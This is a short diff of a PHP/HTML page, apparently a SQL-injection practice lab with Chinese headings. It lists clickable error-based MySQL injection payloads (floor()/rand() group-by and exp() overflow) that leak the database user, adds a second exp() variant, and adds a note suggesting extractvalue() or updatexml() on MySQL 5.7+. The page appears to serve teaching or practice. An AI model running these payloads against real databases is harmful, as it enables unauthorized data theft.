@@ -299,8 +299,10 @@ $conn->close();
                 <h4>3. floor() 函数（大数溢出）</h4>
                 <code onclick="setId('1 AND (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a)')">1 AND (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a)</code>
                 
-                <h4>4. exp() 函数（溢出）</h4>
+                <h4>4. exp() 函数（溢出）- MySQL 5.7+</h4>
                 <code onclick="setId('1 AND exp(~(select * from (select user())a))')">1 AND exp(~(select * from (select user())a))</code>
+                <code onclick="setId('1 AND (select exp(~(select * from (select user())a)))')">1 AND (select exp(~(select * from (select user())a)))</code>
+                <p style="color: #ff6b6b; margin-top: 10px;">⚠️ 注意：MySQL 5.7+ 版本中，exp() 报错可能不会直接显示查询结果，建议使用 extractvalue() 或 updatexml() 函数</p>
             </div>
         </div>
 
